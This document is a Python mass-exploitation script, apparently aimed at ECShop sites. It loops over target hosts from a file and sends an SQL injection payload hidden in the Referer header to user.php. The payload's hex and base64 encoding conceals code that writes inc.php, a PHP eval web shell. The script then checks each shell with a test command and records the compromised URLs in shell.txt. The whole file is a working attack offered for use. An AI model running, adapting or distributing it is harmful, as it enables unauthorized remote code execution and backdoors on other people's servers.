# coding:utf-8
import requests
import re
import time
import os
file = open('shell.txt', 'w')
def getshell(url):
    urls = "http://" + url + '/user.php'
    payload = "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a326c75597935776148416e4c4363385033426f634342415a585a686243676b58314a4655565646553152624d4630704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': 'ECS_ID = 01c024e3ed1ef931e6165fcdbe04dca202893c1f;ECS[visit_times] = 1',
        'Referer': payload,
        'Connection': 'close',
    }
    requests.get(url=urls, headers=headers,timeout=5)
if __name__ == '__main__':
    for eachline in open("url.txt"):
        eachline = eachline.strip(' \n')
        print (u"[***] 正在检查:%s" % eachline)
        try:
            getshell(eachline)
            get_res = requests.get("http://" + eachline + "/inc.php?0=echo'6666';",timeout=10).text
            print(get_res)
            #判断返回内容
            if get_res == "6666":
                print(u"[+++] 成功获取shell:%s" % eachline)
                file.write("http://" + eachline + '/inc.php' + '\n')
                file.flush()
            else:
                print(u"[!!!] 获取shell失败:%s" % eachline)
        except:
            print(u"[!!!] 获取shell出错")
